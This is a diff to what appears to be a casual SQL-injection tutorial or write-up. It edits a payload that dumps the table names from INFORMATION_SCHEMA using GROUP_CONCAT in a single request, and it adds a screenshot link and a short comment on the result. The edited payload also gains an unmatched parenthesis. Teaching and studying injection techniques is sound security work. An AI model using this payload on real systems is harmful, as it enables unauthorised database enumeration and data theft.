@@ -98,7 +98,11 @@ Stressful right? lol i've gat your back mate
 
 we can easily dump the table names once using the ``concat`` statement
 
-```(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0X3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())```
+```((SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())```
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/3d3ba4ed-842f-4f99-8668-f5dd9180e4bc)
+
+cool we have the table names in a single shot
 
 
 
